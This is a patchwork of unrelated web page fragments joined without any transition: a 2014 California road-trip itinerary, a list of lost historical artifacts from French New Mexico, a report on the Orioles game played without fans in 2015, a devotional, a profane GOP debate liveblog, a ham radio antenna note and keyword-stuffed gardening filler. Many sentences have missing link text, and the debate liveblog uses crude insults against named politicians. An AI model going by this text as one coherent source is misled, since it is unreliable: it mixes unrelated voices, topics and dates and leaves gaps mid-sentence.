>Monday September 1st, 2014</h2>   <p>&#x201c;A land of Giants&#x201d;. One of the must have seen locations is &#xa0;/ Sequoia National Forest. The Sequoia tree is known for their extreme size and red colour. The largest tree within the park is the tree with a total height of almost 84 meters, a diameter -at the bottom- of more than 11 meter and an estimated age of 2.200 years. Therefore the Sequoia tree is also referred as the Mammoth Tree. The most famous trees to be found in the park are: &#x201c;General Sherman&#x201d;, &#x201c;General Grant&#x201d;, &#x201c;Washington&#x201d;, &#x201c;President&#x201d; and the &#x201c;Lincoln&#x201d;.</p>   <h2>Tuesday September 2nd, 2014</h2>   <p> can also be visited within the same perimeter of the National Park. As the name indicates, the National Park is actually a Canyon with several rivers and lakes.</p>   <h2>Wednesday September 3rd, 2014 &amp; Thursday September 4th, 2014</h2>   <p>, the location of &#x201c;&#x201c;.. The big wall conquered by Tom Waes () during a 4-day climb in one the episodes of &#xa0;after 14 days of training.&#xa0;To be honest one of the better progams on Belgian National Television (another one is ).</p>   <p>Before anyone dares to ask, no we will not try to climb it&#x2026; We aren&#x2019;t nuts :-).</p>   <h2>Friday September 5th, 2014</h2>   <p>We are moving towards San Francisco and reserved a sleeping spot in San Francisco, we decided to plan a buffer day in case we want to spend some more time at one of the parks, do some laundry, enjoy the day, visit a nearby city, &#x2026;. I&#x2019;m quite sure we will find something to do!</p>   <h2>Saturday September 6th, 2014 to Monday 8th, 2014</h2>   <p>Riding the cable car in San Francisco, cycling the Golden Gate bridge, a little stroll in Chinatown, a slip over to Sausalito, a visit to Alcatraz, &#x2026; These are some of the things planned during these 3 days.</p>   <p>The main event is our visit to &#xa0;or &#x201c;&#x201d; as they call it. A good piece of advise? Get your tickets at least a few weeks in advance, as the free spots are quickly depleted. Buy them on the to avoid being scammed. The island &#x2013; characterized by the lighthouse and the federal penitentiary &#x2013; offers a view on the city of San Francisco. But not many people know prior to the federal penitentiary, the buildings were used as civil war fortress.</p>   <p>An another popular seeing sight is the Golden Gate Bridge, an icon for the city and is also used by as the company logo. I really hope we can see the bridge in it&#x2019;s full glory, they told me most of the year the bridge is limiting the view.</p>   <p>And last but not least.. a trip with the cable car. The hills of San Francisco are too steep to allow regular trams to be used. The cable car uses the cables too pull the car to a higher level. The cable car is only used on the steep hills, on the other routes regular trams are used (such as the ).</p>   <h2>Tuesday September 9th, 2014</h2>   <p>&#x201c;Three IT engineers on the loose&#x201d;. It&#x2019;s impossible for us to avoid Silicon Valley. A little visit to the following locations are appropriate:</p>   <ul>    <li>Facebook Headquarters (1601 Willow Road, Menlo Park);</li>    <li>Google Headquarters (1600 Amphitheatre Parkway, Mountain View);</li>    <li>Microsoft Headquarters (La Avenida Street, Mountain View);</li>    <li>Apple Headquarters (One Infinite Loop, Cupertino);</li>    <li>Intel Museum (2200 Mission College Blvd, Santa Clara).</li>   </ul>   <h2>Wednesday September 10th, 2014</h2>   <p>Driving Highway 1 from San Francisco towards San Diego. the state route is also named differently on various locations, such as Cabrillo Highway, Coast Highway, .. It starts somewhere around and ends near San Diego. During our trip we will pass where you can take guided tour to view whales, etc. You can visit&#xa0;, a historical mansion near San Simeon in Mediterranean Revival of the beginning of the 19ties to break your trip of approximately 7 hours in two.</p>   <h2>Thursday September 11th, 2014</h2>   <p>Basically our first day we didn&#x2019;t plan! The plan is to do nothing and enjoy the sun &#x2013; fingers crossed &#x2013; on the beach of Santa Monica. The beaches from Malibu to LA were the scenery of , a popular serie which was on air the 90ties.</p>   <h2>Friday September 12th, 2014 &amp; Saturday September 13th, 2014</h2>   <p>After a day doing nothing, we proceed towards San Diego. San Diego a city located next to the Mexican border. We planned &#xa0;a visit to the , a flight carrier of the American Army.&#xa0;Additionally we planned a visit to the Old Point Loma lighthouse, Fort Rosecrans Cemetry &amp; the San Diego Air &amp; Space Museum.</p>   <h2>Sunday September 14th, 2014</h2>   <p>On our road to our final destination and the location where our adventure started: Los Angeles.. Next night will be the last night in America. Tomorrow we&#x2019;ll be heading homewards to Belgium.</p>   <p>We will fill our day probably by doing some shopping and strolling in LA.</p>   <h2>Monday September 15th, 2014</h2>   <p>time to drop-off our car at to make our way to the airport. Our flight takes of around 08:40 and makes a little detour to Washington before heading to Brussels Airport. We should be arriving around 7:15, so we will be more than on time to join Belgium traffic jams.</p>   <p>The countdown can start&#x2026;.</p>  </div>

In 1883,&#xa0;the church burned and was rebuilt.&#xa0;The statue might have been moved to a museum in Texas but its precise location is unknown.   </div>   <div>    <p><strong>WHERE IS FRANCOIS MALLET&#x2019;S SHOTGUN? </strong><span>Not yet found.</span> In 1879, John B. Lamy Jr., nephew of Archbishop Lamy, shot and killed Fran&#xe7;ois Mallet, architect working of the cathedral, because he believed his fellow Frenchman was involved in a relationship with his wife. Mallet&#x2019;s estate included a double-barreled shotgun, which was given by Mallet&#x2019;s parents to Captain Louis Felsenthal, a hero of the Civil War in New Mexico. I am trying to locate this gun.</p>   </div>   <div>    <strong>WHO WAS LOUIS BOUCHER?</strong> The life of Louis Boucher (Louis de Bouchere) is elusive. Little is known of his beginnings, and nothing of his final years.&#xa0; He might have resided in Quebec in 1875, was a trail guide at Grand Canyon in 1891 and 1892, and was known as &#x201c;the Hermit&#x201d;. There was a Louis Boucher associated with the Sioux who married a daughter of Chief Spotted Tail (Chief of the Brules Sioux tribe) and niece of Crazy Horse, Chief of the Oglala Sioux tribe, and smuggled guns to the Sioux, but it is not certain that this is the same person. He left the Grand Canyon region in 1909 when the Santa Fe Railway interfered with the mining he had filed with the County. There are records of his grievances to the U.S. Forest Service, and of a visit to Albuquerque where he met District Forester Ringland in 1909. By way of New Mexico and Colorado, Louis journeyed to central Utah working in coal mines. He returned to Colorado only once, in 1912, and visited the Grandview Hotel at Grand Canyon.   </div>   <div>    <strong>WHAT HAPPENED TO CORSICAN PRIEST F.M.&#xa0; PAOLI? </strong>The Paoli family of Corsica is legendary. Pascal Paoli is the Corsican Jefferson, he helped draft the US Constitution, and several US towns bear his name. Rev. James de Fouri, in his Historical Skectch of the Catholic Church in New Mexico, wrote:    <em>&#x201c;In May 1867, Bishop Lamy was returning from France where he had been recruiting priests.&#xa0; He sailed from Le Havre &#x2026; accompanied by a cohort of young men, many of them were French: &#x2026; &#xa0;Father <strong>J.M.</strong>(sic)&#xa0;<strong> Paoli</strong>, a priest from the island of Corsica &#x2026;&#x201d;.</em>What happened to F.M. Paoli? I could not find his name in any record.   </div>   <div>    <strong>FRENCH WIFE OF&#xa0;DIEGO DIONISIO&#xa0;DE PENALOSA</strong>    <span>Not yet found.</span> In 1660, Diego Dionisio de Pe&#xf1;alosa had been appointed Spanish provincial governor of New Mexico.&#xa0; In the eyes of the Roman Catholic friars, his administration was treating too well the Pueblo Indians and their religious practices.&#xa0; Pe&#xf1;alosa was declared a heretic, had his property confiscated and was forced into exile in 1663. He ended up in France around 1673, and is said to have married a French wife.    <strong><span>Who was this lady?</span></strong> He died in France in 1687.   </div>   <div>    <strong> BISHOP LAMY&#x2019;S HAT </strong>    <span>Not yet Found.</span>   </div>   <div>    The hat was stolen a few years ago at Bishop&#x2019;s Lodge during a party.&#xa0; No questions asked if you find it.   </div>   <div>    <strong> NAPOLEON&#x2019;S PAINTING </strong>    <span>Not yet Found, but getting closer.</span>   </div>   <div>    This is a large painting of Napoleon which was acquired by retreating Confederates during the civil war in New Mexico. It was said to be for some time in San Miguel Church in Socorro. In 1887, it was hanging in the office of the El Paso newspaper,    <em>The Bullion</em>, then in 1899 it was no longer there.

His diary was copied and survived to our times, but the original has never been found.   </div>   <div>    The map vanished in the 20th Century, below if a copy made around 1840.   </div>   <div>    Map image: Courtesy Barry Lawrence Ruderman Antique Maps &#x2013; RareMaps.com   </div>   <div>    <strong> SANTA FE CATHEDRAL&#x2019;S CORNER STONE <span>Not yet Found.</span></strong>   </div>   <div>    The corner-stone was laid in 1869. A casket buried with the stone&#xa0; contained the names of the President of the United States, General Grant, of the Governor of the Territory, and other Territorial officers, together with some coins of gold, silver and copper, and also some documents and newspapers. Three days afterwards someone stole the corner-stone, with its contents, and nothing has been heard of it since.   </div>   <div>    <strong> GARNIER CLOCK OF THE PARROQUIA <span>FOUND!</span></strong>   </div>   <div>    It is in the museum of the Archdiocese in Santa Fe. For a while, a large clock graced the center fa&#xe7;ade of the Parroquia. The clock was built in 1869 by the renowned French clockmaker house of Jean-Paul Garnier of Paris, France. There are fifty-six pieces by Garnier in the Louvre Museum in Paris where a gallery is named after him. There are many other famous Garnier clocks in the world, for instance on the Tour de l&#x2019;Horloge of the Gare de Lyon in Paris, the clock above the entry gate of the Court of Cassation also in Paris, and the Tour de l&#x2019;Horloge Dolmabah&#xe7;e in Istanbul. Reverend Pierre Eguillon donated eight-hundred dollars to buy and install the clock. The clock, however, never worked correctly in spite of attempts to fix it. The original clock face was stored in various places with its gears missing, and it is now (2015) in the museum of the Archdiocese in Santa Fe.A small uncertainty remains: the clock in the Archdiocese museum has a brown face, while the clock in old photographs is white. Upon close examination of the old photograph, it seems that the white clock might have rusted and/or have been repainted.   </div>   <div>    <strong>FRENCH GOODS FROM THE SANTA FE TRAIL <span>Not yet found.</span></strong>   </div>   <div>    Tin Cans: In 1859, Randolph B. Marcy, Captain U.S. Army published The Prairie Traveler as &#x201c;the best-selling handbook for American pioneers&#x201d;. This is a practical manual for safe travel across the prairies to the West. This book recommends canned vegetables from Chollet and Co. in Paris. Would anyone have saved some of these cans?   </div>   <div>    Cigars &amp; Cigarettes: Pierre Abraham Lorillard (1742-1776) emigrated from France to the US and founded a cigarette and cigar factory. Lorillard was a familiar brand on the Santa Fe Trail and in New Mexico. Lorillard (Greensboro, North Carolina) is America&#x2019;s oldest tobacco company with over $5 billion sales in the US (in 2010).   </div>   <div>    <strong> LETTERS FROM FRENCH PRIESTS AND OTHER FRENCH TO FAMILIES IN FRANCE </strong>    <span>Not yet found.</span>   </div>   <div>    There was a big pile of such letters on a priest&#x2019;s desk in France, but it seems that they were thrown away.

In 1892, he moved as a missionary priest to Manitou, Colorado,&#xa0; in hopes of restoring his failing health. His mother arrived in Manitou from New Mexico in July 1893, bringing four French-speaking servants, as well as furnishings, tapestries, oils, statuary, antique vestments and laces, and native artifacts, which were displayed in the gallery on the third level of what is now Miramont Castle.

A $500 reward was offered but the culprits were never found. It is believed that he was victim of a conspiracy from Santa Fe. Descendents of the murderers, through family oral history, probably have the answer.   </div>   <div>    <strong>BISHOP LAMY&#x2019;S UMBRELLA <span>Found!</span></strong>   </div>   <div>    It has an ivory handle with Lamy&#x2019;s name carved on it.

It turns out that the piano&#xa0;at the Girls Camp in Cimarroncita, was made in 1878 (too late to belong to Maxwell),&#xa0; came from the St. James Hotel (owned by Frenchman Henri Lambert) but not from Maxwell&#x2019;s house&#xa0;in Cimarron.    <div>     <strong>PHOTOGRAPHS AND LETTERS OF THE GIRARD FAMILY (Of Albuquerque&#x2019;s Girard Avenue) <span>Found!</span></strong>     <div>      Thank you to Nancy Tucker&#x2019;s Postcard Collection for locating this extraordinary documents, a huge box of photos, letters&#xa0;and other stuff, some of it from France.

Usually fans would be discouraged from standing here by Orioles officials. But on this day a security guard stood nearby, arms folded. He had jokes.</p>     <p>&#x201c;Standing room only,&#x201d; he said.</p>     <p>There were a few muffled laughs. That&#x2019;s all you&#x2019;ll get out of Baltimoreans these days. They were gathered here because the uprising in the city &#x2013; which twice had become violent, including near the stadium &#x2013; convinced Major League Baseball to, for the first time ever, bar fans from one of its games.</p>     <p>So there they stood. The crowd never swelled to more than 50. Fans rotated in and out, tiring of the view. Some watched from the porch of the Hilton Hotel across the street.</p>     <div>      <p>Photo by Patrick Smith/Getty Images</p>     </div>     <p>A well-positioned fan could have tried to spot the action on the field by looking through the legs of a bronze Cal Ripken Jr. statue, then under the outstretched leg of mid-delivery Jim Palmer. That view would have been as good as any.</p>     <p>Fans on the right side of the fence relied on those to the left to see what the shortstops and third basemen were doing. Tall fans reported back to short ones. Cheers took an extra moment as the clear pop of the ball traveled out to the group.</p>     <p>Hurson, a public defender who lives in Northern Baltimore, hoisted his sign into the air dozens of times throughout the game, which the Orioles won 8-2. It said, &#x201c;DON&#x2019;T FORGET FREDDIE GRAY,&#x201d; with Orioles logo standing in for the letter Os.</p>     <p>Gray is the 25-year-old West Baltimore resident who died after being injured in police custody, and the reason that thousands of protesters from poor neighborhoods in Baltimore took to the streets in the first place.</p>     <p>&#x201c;I think a lot of people forget that the reason there is so much anger and frustration is police brutality, among other reasons,&#x201d; said Hurson. &#x201c;Especially today with all the coverage from around the country about how we&#x2019;re not inside, and they&#x2019;re talking about security and safety.</p>     <p>&#x201c;And the only and safety and security we should be talking about is the safety of the poor communities of Baltimore.&#x201d;</p>     <p>Hurson disagreed with the decision to shut fans out, lamenting the lost possibility of uniting people in the city.</p>     <p>Others felt the same but were angry. One woman screamed into a camera that the rioting and looting shown on national television was un-American and had caused this, the un-American exiling of a fan base from its baseball game. Near tears, she would not give her full name.</p>     <div>      <p>Tommy Gilligan-USA TODAY Sports</p>     </div>     <p>She was about as heated as the afternoon got. When those in attendance weren&#x2019;t being interviewed by reporters from national television and print outlets, they tried to take measure of how the Orioles were playing.</p>     <p>&#x201c;Next time Ubaldo pitches,&#x201d; one said, &#x201c;let&#x2019;s just all turn around and not watch.&#x201d;</p>     <p>Ubaldo Jiminez pitched seven innings without giving up an earned run Wednesday.</p>     <p>They chanted his name. Who knows if he was able to hear.</p>     <p>The fans were at times boisterous &#x2013; the traditional shout of &#x201c;Oh!&#x201d; during the national anthem rang off the walls of a nearby hotel &#x2013; but being on the outside hurt, ultimately. Camden Yards is credited with helping to rejuvenate Baltimore. It&#x2019;s retro, fan-friendly design changed the way baseball is watched across the country. Through lean years, many of them kept coming to the yard.</p>     <p>Now, on a warm day in late April, it was empty as the Orioles shredded through one of the better pitchers in the American League.</p>     <p>Large National Guard vehicles deployed from a lot behind the stadium. The constant whir of helicopters above persisted.</p>     <p>Otherwise there were few signs of a game being played, or that this had been the site of a clash between protesters and baseball fans that helped stir the violence here on Saturday.</p>     <p>Sliders Bar and Grille was a pivot point in the protest turning unruly, as videos show fighting between patrons and young people who had walked from West Baltimore.</p>     <p>Wednesday the crowd there was sparse.</p>     <p>Outside Pickles Pub, just a few doors down, a sign mocked Baltimore Mayor Stephanie Rawlings-Blake for saying she &#x201c;gave those who wished to destroy space to do that,&#x201d; a comment she has since tried to rescind. It read: &#x201c;WE PROVIDE &#x2018;SPACE&#x2019; FOR FOOD, BEVERAGE, AND FUN TIMES.&#x201d;</p>     <p>&#x201c;There&#x2019;s a message there and people might run with it, but really we want the people in the city to know that this is a place they can come together,&#x201d; said Craig Ziegenheim, a 28-year-old manager at the bar.</p>     <p>Back over near the stadium, brothers Les Bowen, 28, and Larry Marsh, 21, agreed that the game should remained closed to the public.</p>     <p>&#x201c;We come here because sports brings different people together,&#x201d; Bowen said. &#x201c;It&#x2019;s sad that we can&#x2019;t have that today.&#x201d;</p>     <p>The brothers drove from their Chincoteague, Va. home early Wednesday to try to help in the city where they were raised. They cleaned some trash near the Inner Harbor, then headed to the stadium, hoping to find other fans.</p>     <p>&#x201c;I think people will come,&#x201d; Marsh said. &#x201c;It&#x2019;s another way to show the city is strong.&#x201d;</p>     <p>Some saw going to the game as usual as a duty. Matt Fouse just thought it was a good day for baseball. The Baltimore artist usually sits in Section 45, Row 2, Seat 7, a little ways off from home plate. Wednesday he stood with the others, his six-month old daughter resting in her stroller.</p>     <p>He thought being here was his way to show love for the city. Beyond that, he, like so many, was at a loss.</p>     <p>&#x201c;What&#x2019;s happened here is sad and disheartening and I wish I knew what could help us all heal,&#x201d; he said. &#x201c;But I&#x2019;m not qualified to give an answer because I&#x2019;m not one of the people trapped in what has been going on.&#x201d;</p>    </div>    <p>, , , </p>    <div>     <div>      <span>2.5k</span>      <span>shares</span>     </div>     <div>      <span>share</span>     </div>     <div>      <span>tweet</span>     </div>     <div>      <span>sms</span>     </div>     <div>      <span>send</span>     </div>     <div>      <span>email</span>     </div>    </div>   </div>   </div>

   <div>   <h2>Sunday Stillness &#x2013; Deuteronomy 33:25</h2>   <div>    <p>Watercolour Painting by Janis Cox, 2013 based on an ad I found at   </div>   <p>Last Sunday the Sunday School in Arizona asked me to do the Storyteller&#x2019;s part for the children&#x2019;s service. I had done this a couple of times last spring. I received the story and realized it was a Proverb &#x2013; not a real story.</p>   <p>Of course, Satan tried to have a field day with me. He told me, &#x201c;You can&#x2019;t do this.&#x201d; I felt confused. Then I said to myself, &#x201c;No way, Satan, you are NOT getting to me. I have Jesus to give me strength, words and confidence.&#x201d;</p>   <p>In my weakness &#x2013; I kept saying &#x2013; He is strong. And He was. Even though I didn&#x2019;t feel adequate at all, I kept trusting Jesus to pull me through. And He did in a marvellous way. I had a great time. I thoroughly enjoyed myself.</p>   <p>So this pair of sandals is my vision for this strength. There are two very different versions for this passage. In the New Kings James Version it is sandals.</p>   <blockquote>    <p>Your sandals&#xa0;<i>shall be</i>&#xa0;<b>iron</b> and bronze; As your days,&#xa0;<i>so shall</i>&#xa0;your strength&#xa0;<i>be (, NKJV).</i></p>   </blockquote>   <p>But check out what the NIV says:</p>   <blockquote>    <p>The bolts of your <b>gates</b> will be <b>iron</b> and bronze, and your strength will equal your days.</p>   </blockquote>   <p>And The Message:</p>   <blockquote>    <p>Safe behind <b>iron</b>-clad doors and <b>gates</b>, your strength like <b>iron</b> as long as you live.</p>   </blockquote>   <p>I decided it didn&#x2019;t matter what the vision &#x2013; the strength is the same. I like the idea that:</p>   <h3> (Tweetable)</h3>   <p>The whole point is &#x2013; God gave me strength. I allowed Him to be the strength in my weakness.

   <div>   <p><small>From time to time, here at Hammer of Truth one of us will . This is what it looks like.</small></p>   <p>On Wednesday February 22nd 2012, four GOP candidates for president got on stage to once again lay into each other in the <del>new public blood sport</del> democratic process of of getting to know our next commander in chief. From left to right on the stage were Ron Paul, Rick Santorum, Mitt Romney and Newt Gingrich. Most people have been more interested in Whitney Houston&#x2019;s sudden death over the past week and a half than anything political, so we&#x2019;ll see if the first post-Whitney GOP debate is a pop or a drop amongst the American rabble.</p>   <p>The complete transcript of the debate can be found . Ron Paul highlights can be found . Read on for our official Hammer of Truth verdict on the debate and be sure to leave your thoughts on how the candidates did. </p>   <p><small>All times are <strong>EST</strong> (I hated having to add that shit on every update, so hurray efficiency):</small> </p>   <p><strong>19:40</strong> CNN doing pregame prep on their stage, before it was a shot of the White House being patrolled by men in trench coats. It seems we&#x2019;re having everyone in the sit-down format this time, so we&#x2019;ll probably get a few nice tight shots of some angry finger pointing.</p>   <p><strong>19:44</strong> CNN Saying the Arizona GOP is co-hosting this with them is like saying a fat kid who gets a pin from the airline is a pilot. They will be allowed to approach microphones in the audience area like the other peons, CNN hosts will be the only persons allowed on stage with the candidates.</p>   <p><strong>19:57</strong> I&#x2019;m really digging CNN&#x2019;s style, now if they will only bring some substance this time. One question we&#x2019;d love to see tweeted about a bajillion times is how the candidates feel about over a minor amount of marijuana. There, insta-substance <em>plus</em> style points.</p>   <p><strong>20:04</strong> Candidates have just been introduced. They are all mic&#x2019;ed up individually so there&#x2019;s a good chance we&#x2019;ll hear some under the breath snipes between candidates, and certainly lots and lots of sighing.</p>   <p><strong>20:10</strong> Santorum talking about how he&#x2019;s going to end all those damn welfare for corporations. No wait, he&#x2019;s going to get rid of entitlement programs for lazy poor people. Santorum keeps acting like Santorum is going to happen. Hold hands with Gingrich and please go away.</p>   <p><strong>20:11</strong> Romney lives in the world of business, he balanced his budgets. He also balances on the fence on damn near every issue until he sees which one is winning.</p>   <p><strong>20:14</strong> Santorum reminds everyone that Romney raised taxes. Romney says no no no, he&#x2019;s going to cut taxes. Come on, you can trust him, he has gray sideburns.</p>   <p>Gingrich gets involved and starts jabbering about how he&#x2019;s going to balance the budget, by exploiting oil and natural resources. Millions of oily oily jobs. I&#x2019;m excited at this oil-covered Gingrich future.</p>   <p><strong>20:18</strong> CNN asks why Paul says Santorum is a fake. Paul says because he is. Massive applause. Points out that Santorum voted for No Child Left Behind but is now running against it. Santorum&#x2019;s face is a snarled mess. Paul says out they are all big spenders on foreign aid.</p>   <p><strong>20:19</strong> Santorum talks about some endorsements from some psuedo-conservative organizations no one gives a shit about. The crowd laughs because he&#x2019;s talking fast and acting nervous. Ron Paul ranked in the bottom with that clearly stacked organization. Paul comes back and calls that comparison answer a &#x201c;cop out&#x201d;.</p>   <p><strong>20:22</strong> Back to Romney, he was a &#x201c;severe, strict&#x201d; governor of Massachusetts and he will gladly rule America with that same <b>Iron</b> Fist. For the children.</p>   <p><strong>20:24</strong> Gingrich gets a question about supply side economics. His face goes blank as he tries to figure out how to change the subject. Oh look, he changed the subject to a populist &#x201c;modern border control&#x201d;. Hello Arizona, Gingrich has ADD.</p>   <p>&#x201c;Let&#x2019;s get back to a balanced budget&#x201d; like the line of credit he had with Tiffany&#x2019;s.</p>   <p><strong>20:29</strong> Santorum lays into Romney over earmarks for Salt Lake City Olympics funding. He can barely defend his record on earmarks so he&#x2019;s trying to take everyone down with him, including Bush and Cheney. Santorum would oppose earmarks as president, someone in the audience boos. Romney calls the process broken, and then elaborates on how he exploited it &#x201c;to save the Olympics&#x201d;.</p>   <p><strong>20:31</strong> SCREEN GRABS OF THE MOMENT. Knee slapping between the three stooges when Romney is the butt of the joke, and Ron Paul having a teaching moment:</p>   <p><strong>20:32</strong> ALL HAIL HYPNO-CNN.</p>   <p><strong>20:36</strong> Romney is pretty good at business, this much is true. Are his hands clean? That&#x2019;s a definite no, so that&#x2019;s why he supports TARP, but not GM bailout.</p>   <p>Because&#x2026; deep breath&#x2026; <em>&#x201c;ALL THE BANKS COULD HAVE COLLAPSED&#x201d;</em>. What a load of hooey.</p>   <p>His favorite word: &#x201c;managed bankruptcy&#x201d;. Sounds a lot like a nod to .</p>   <p><strong>20:41</strong> Paul says all &#x201c;bailouts are bad, and we shouldn&#x2019;t be doing it.&#x201d; Gives us an analogy to a criminal robbing people, being good at it, and so for that reason being allowed to continue. Bankruptcy for General Motors would have been natural, also for banks.</p>   <p><strong>20:43</strong> Finally a commercial break, these guys jabbering on is hard to follow with a keyboard. Once again Paul is being marginalized (with tricky camera angles only showing Santorum/Romney/Gingrich being the worst culprit and a lack of questions being a close second). John King is less of a douche tonight, letting the candidates do all the talking and encouraging the crowd booing.</p>   <p><strong>20:47</strong> Gingrich bringing back the &#x201c;elite media&#x201d; dog whistle, I wonder if the elite media can get lines of credit at Tiffany&#x2019;s. They are going apeshit over birth control, one of the worst wedge issues in modern politics. Romney calling people liberal on any issue is just trolling.</p>   <p><strong>20:49</strong> Santorum says contraception is dangerous. Teens are sexually active! Children raised by chidren, drug use, anarchy, nihilism. &#x201c;EVERYTHING IS NOT GOING TO BE FINE!&#x201d; I bet he drinks a lot.</p>   <p><strong>20:51</strong> Paul says get the government out of medical issues. The &#x201c;pills can&#x2019;t be blamed for the morality of society&#x201d;.</p>   <p><strong>20:52</strong> Romney says too many kids being born out of wedlock, asks &#x201c;how are we going to have a society?&#x201d; Kids being in a home with a mother and father gets applause, loaded language indicates &#x201c;a mother and a mother&#x201d; or &#x201c;a father and a father&#x201d; is not the society he&#x2019;s willing to entertain. Unless it polls higher in this primary state.</p>   <p><strong>20:55</strong> Oh look, Gingrich has something to say about family values, everyone try not to laugh. Surprise, he changed the subject to coercion of the state to try and appeal to libertarians.</p>   <p><strong>20:56</strong> Paul teaches everyone about the chemical structure of birth control pills and morning after pills (they are very similar). Did we mention he&#x2019;s an actual fucking doctor?</p>   <p><strong>20:58</strong> Someone please make a dubstep song with Santorum saying &#x201c;children being sexually active&#x201d;. I predict great reception.</p>   <p><strong>21:02</strong> Santorum and Rmoney get into a heated fight over Obamacare and Rmoneycare.</p>   <p>Santorum writes &#x201c;eat me, you cunt&#x201d; on a piece of paper while Romney <del>angrily</del> louder than normally tries to defend his record. Santorum circles and draws him out. Paul and Gingrich laugh at the tangle. The crowd begins to boo both of them, so John King moves to an audience question.</p>   <p><strong>21:06</strong> Paul fields a question on border enforcement, says we could do a better job securing our own borders than the ones in the Middle East, snap. Says there should be no mandate by the federal government, calls immigration inefficient. Romney coughs loudly.</p>   <p><strong>21:09</strong> <em>SNAP ASSESSMENT:</em> The GOP is good at building walls and telling other people to tear theirs down. Guess we won&#x2019;t be talking about the next step within walled society, which is internal checkpoints.</p>   <p><strong>21:10</strong> Romney endorsed e-verify and REALID and you should just be a good American and get chipped already to work that job because that&#x2019;s obviously preferable to some dirty immigrants takin yer jerb.</p>   <p><strong>21:13</strong> Gingrich &#x201c;voted in 1986&#x201d; for the bill that was supposed to solve all the immigration problems. Of course that bill failed. May we remind the former House Speaker that those who give up essential liberty for temporary security will get neither?</p>   <p><strong>21:20</strong> King asks for one word from each candidate to label themselves with: Paul &#x2013; consistent Santorum &#x2013; courage Romney &#x2013; resolute Gingrich &#x2013; cheerful</p>   <p><strong>21:22</strong> My one word for each candidate: Paul &#x2013; underdog Santorum &#x2013; shitty Romney &#x2013; flipper Gingrich &#x2013; philanderer</p>   <p><strong>21:24</strong> Paul says he&#x2019;s afraid a draft is in the making with all these wars. He doesn&#x2019;t want men or women being killed in wars, calls pre-emptive war morally unjust. Defensive posture only. Doesn&#x2019;t call tonight. Santorum, Romney and Gingrich all more support foreign entanglements because lol, not their ass.</p>   <p><strong>21:26</strong> Gingrich saber rattles at Iran, calling him a dictator. Romney says enact &#x201c;crippling&#x201d; sanctions. Santorum says sanctions plus more saber rattling. Here&#x2019;s a not-scary map of Iran&#x2019;s threat to America:</p>   <p><strong>21:32</strong> Paul says, they feel threatened, so they seek weapons&#x2026; he says look at the map (that I just posted, lol). Paul says worry more about the Soviet-era nukes than new hypothetical nuke programs. Paul warns that war must be declared, and not to do it lightly.</p>   <p><strong>21:35</strong> King changes topic to Syria. Same question, different bullshit. Santorum calls them an &#x201c;axis&#x201d; and would be more aggressive in the Middle East. Calls the situation &#x201c;cataclysmic&#x201d;. If Santorum is elected I expect the bunker industry to boom thanks to his paranoia.</p>   <p><strong>21:37</strong> Gingrich wants to engage the entire region. There&#x2019;s a multiple partners joke in there somewhere. Romney wants to get involved in Syrian conflict, because&#x2026; America: world police.</p>   <p><strong>21:39</strong> Paul &#x201c;I tried the moral argument, I tried the constitutional argument&#x201d;. He switches gears to then the financial argument, &#x201c;we don&#x2019;t have the money&#x201d;. He goes on, &#x201c;I&#x2019;m going to win this argument for the economic reason &#x2026; The Soviets left because they were broke.&#x201d; Big applause.</p>   <p><strong>21:47</strong> EDUCATION! Everyone on the stage: got mine, up yours. Oh wait, we will help you with pretty school buildings. Gingrich says rebuild from ground up. Ron Paul goes last and gets biggest applause for his radical platform to ends the federal Department of Education and return the issue of education back to the states. Consistent.</p>   <p><strong>21:51</strong> King poses the biggest misconceptions question to each candidate.</p>   <p>Paul: &#x201c;That I can&#x2019;t win&#x201d;. Says to look at his to the rallies (and they are sizable, yes), that misconception is not present. Gingrich: The amount of work he did, many many many years ago. Romney: goes offtopic, then scolds King when he tries to help steer him. Delivers a stump speech instead of answering the question. Santorum: follows Romney&#x2019;s lead and talks about how much money Obama has raised. Another stump speech.</p>   <p><strong>21:56</strong> Show&#x2019;s over, CNN&#x2019;s King thanks the Arizona GOP. They can each expect a commemorative pin in the mail for their help in selling out the democratic process in another lame-ass &#x201c;debate&#x201d;.</p>   <p><strong>0:29</strong> Thank you to Betty Liberty for pointing out Santorum&#x2019;s .</p>   <p>No Rick, we told to you hold hands with Gingrich and leave. But seriously, who the hell shakes hands like that? Angry losers.</p>   <div>    <div>     <h3>YOUR FRIENDS NEED COMMON SENSE, SHOVED UP THEIR...</h3>    </div>   </div>  </div>

   <div>   <p>I live in an HOA (Home Owners Association) neighborhood in Gilbert, Arizona. What that means is &#x201c;No Antennas&#x201d;. What that means to me is &#x201c;No Antennas that are permanent and can be easily seen&#x201d;. I choose to live in this neighborhood so I don&#x2019;t blame the HOA for restricting my antenna choices. I also wouldn&#x2019;t put up an antenna that would be an &#x2018;eye-sore&#x2019; to my neighbors.</p>   <p>My Antenna is a 31&#x2032; tall, vertical fiberglass pole with a 16g wire down the middle. It is telescopic from 4&#x2032; to 31&#x2032;. You twist lock each 4 foot section together as you extend the sections. It goes up or down in about 1 minute. To date is has been an excellent antenna and very low cost. I have worked a lot of DX for such a simple install.</p>   <p>At the base of the antenna is a 4:1 homebrew UNUN and an extensive ground radial network. I have twenty five, 31&#x2032; copper wires that fan out from the mounting point. There is also an 8&#x2032; copper ground rod, driven straight down, to provide the central &#x2018;tie&#x2019; point and an earth ground. You can see in the 1st picture above a rod <b>iron</b> fence at the north end of the yard. Some of the radials meet up with the 81&#x2032; fence and I have terminated them to it. It really made a difference and provides a nice extended ground-plane. </p>  </div>

   <div>      <p>Vegetable gardening in Rillito <b>AZ</b> 85654 can be a wonderful hobby that anyone in Rillito <b>AZ</b> 85654 can start regardless of age. Usually when people start this hobby they quickly get hooked on to it. Even though it is simple, there are a lot of things which you have to learn if you want to take on gardening seriously. You should take steps to educate yourself and increase your knowledge of becoming a good gardener in Rillito <b>AZ</b> 85654. Thankfully there are many ways available now through which you can acquire the necessary knowledge.</p>   <p>In this article, we shall discuss a few key points when you are just starting out with vegetable gardening. I shall also mention a few other sources where you can get additional information.</p>   <p>1. Decide what vegetables want to grow in Rillito <b>AZ</b> 85654. You need warm for some vegetables while others need colder climates. So the place where you stay and the season can play an important role in selecting the vegetables you want to grow. Cabbage, lettuce and peas need cooler climates. These vegetable plants should get sufficient amount of time to mature before the weather becomes warm otherwise they may die or seed prematurely. On the hand, tomatoes, cucumbers and sweet corn grow well in warm climates. They need average temperatures between 60-95 degrees Fahrenheit.</p>   <p>2. When you have selected a vegetable, the next step is to research the soil quality in your home where you want to plant the vegetable. You have to make sure that the soil is really suitable for the vegetable you are trying to grow.</p>   <p>3. After confirming 